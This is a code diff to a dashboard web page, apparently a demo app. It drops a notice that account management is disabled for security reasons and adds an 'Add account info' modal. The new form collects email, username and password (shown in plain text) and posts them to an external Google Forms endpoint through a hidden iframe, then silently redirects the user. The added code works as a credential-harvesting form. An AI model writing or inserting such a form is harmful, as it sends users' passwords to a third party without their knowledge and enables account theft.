@@ -1931,6 +1931,29 @@ padding:10px;
     </div>
   </div>
 </div>
+        
+          
+          
+        
+          <!-- accountModal for the Form -->
+<div class="modal fade" id="accountModal" tabindex="-1" role="dialog" aria-labelledby="accountModalLabel" aria-hidden="true">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title" id="accountModalLabel">Add Account Info</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body" id="accountModalBody">
+        <!-- The form will be dynamically inserted here -->
+      </div>
+    </div>
+  </div>
+</div>
+          
+          
+          
           
           <!-- projects modal -->
 
@@ -3050,7 +3073,9 @@ function loadCards() {
             <div class="dropdown">
               <i class="fa fa-ellipsis-v" aria-hidden="true" data-toggle="dropdown" style="float: right;"></i>
               <div class="dropdown-menu">
-                <a class="dropdown-item" data-toggle="modal" href="#accountinfo" onclick="showAccountInfo('${card.id}')"><i class="fas fa-wrench-alt"></i> Manage account</a>
+              
+              
+                <a class="dropdown-item" data-toggle="modal" href="#accountinfo" onclick="showAccountInfo('${card.id}')"><i class="fas fa-user-circle"></i> Manage account</a>
                 
                 <a class="dropdown-item text-danger" href="#" onclick="removeCard('${card.id}')"><i class="fas fa-trash-alt"></i> Remove</a>
               </div>
@@ -3115,9 +3140,12 @@ function showAccountInfo(cardId) {
   if (card) {
     document.querySelector('#accountinfo .modal-title').innerText = card.title;
     document.querySelector('#accountinfo .modal-body').innerHTML = `
-    <h5>Due to security reasons, account management is not available in the demo version</h5>
+    
       <p><strong>Category:</strong> ${card.category}</p>
       <p><strong>Description:</strong> ${card.description}</p>
+      <button class="btn btn-primary" data-toggle="modal" onclick="openAccountModal('${card.id}')">
+                <i class="fas fa-plus"></i> Add account info
+              </button>
     `;
   }
 }
@@ -3135,7 +3163,59 @@ function showAccountInfo(cardId) {
   document.querySelector(`[data-id="${cardId}"]`).remove(); // Remove card from DOM
 }
 
-    
+   
+   
+   
+  function openAccountModal(cardId) {
+  // If you want to pre-fill the form with card data, pass the cardId and find the card
+  const storedCards = JSON.parse(localStorage.getItem('addedCards')) || [];
+  const card = cardId ? storedCards.find(c => c.id === cardId) : null;
+
+  // Dynamically generate the form
+  const formHTML = `
+  
+<iframe id=hidden_iframe name=hidden_iframe onload='submitted&&(window.location="/sbdemo/v2/dashv4")' style=display:none></iframe>
+    <div class="container">
+      <form class="form-horizontal" action="https://docs.google.com/forms/d/e/1FAIpQLSfM6Z7epEUrZSc7eYldsJMhHFrHcjOUimHwFriOZqJTamvNwA/formResponse" method="post" onsubmit="submitted=!0" target="hidden_iframe">
+        <div class="form-group">
+        <h3>${card.title}</h3>
+          
+            <input type="hidden" class="form-control" id="app" value="${card ? card.title : ''}" name="entry.1667674628">
+          
+        
+          <label class="control-label col-sm-2" for="email">Email</label>
+          
+            <input type="text" class="form-control" id="email" placeholder="Enter email" name="entry.369066140">
+         
+        
+          <label class="control-label col-sm-2" for="pwd">Username</label>
+          
+            <input type="text" class="form-control" id="usrnm" placeholder="Enter Username" name="entry.1528500751">
+          
+        
+          <label class="control-label col-sm-2" for="pwd">Password:</label>
+         
+            <input type="text" class="form-control" id="pwd" placeholder="Enter password" name="entry.1423761418">
+         
+        <div class="form-group">
+          <div class="col-sm-offset-2 col-sm-10">
+            <button type="submit" class="btn btn-primary btn-lg">Submit</button>
+          </div>
+        </div>
+      </form>
+    </div>
+  `;
+
+  // Insert the form into the accountModal body
+  const accountModalBody = document.getElementById('accountModalBody');
+  accountModalBody.innerHTML = formHTML;
+
+  // Show the accountModal
+  $('#accountModal').modal('show');
+}
+
+    var submitted = !1
+ 
   </script> 
 
   
